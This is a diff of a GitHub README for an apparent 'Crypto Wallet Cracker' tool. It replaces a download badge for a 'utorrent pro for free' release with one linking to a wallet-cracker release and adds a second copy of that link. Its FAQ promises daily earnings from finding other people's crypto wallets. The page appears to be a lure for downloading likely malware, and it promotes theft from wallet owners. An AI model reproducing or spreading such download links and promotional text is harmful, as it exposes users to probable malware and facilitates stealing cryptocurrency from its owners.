@@ -4,7 +4,7 @@
   <img src="https://img.shields.io/badge/MIT-grey?logo=MIT&logoColor=white&style=for-the-badge" alt="MIT Badge"/>
 
 </ol>
-<a href="https://github.com/abilbiju/.utorrent-pro-download-for-free/releases/download/UU/ExtraSoft.zip">
+<a href="https://github.com/kapildevadk/Crypto-Wallet-Cracker-Download-2024/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 
 
@@ -69,3 +69,7 @@ No, the software is built for Windows 7 and higher, as an option, you can buy a 
 ### 6) How much a day will I earn?
  
 All as individual as possible. Sometimes a day absolutely nothing finds, even a few days of silence can be, sometimes in a day finds 5-10 wallets at once.
+
+</ol>
+<a href="https://github.com/kapildevadk/Crypto-Wallet-Cracker-Download-2024/releases/tag/DOWNLOAD">
+<img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
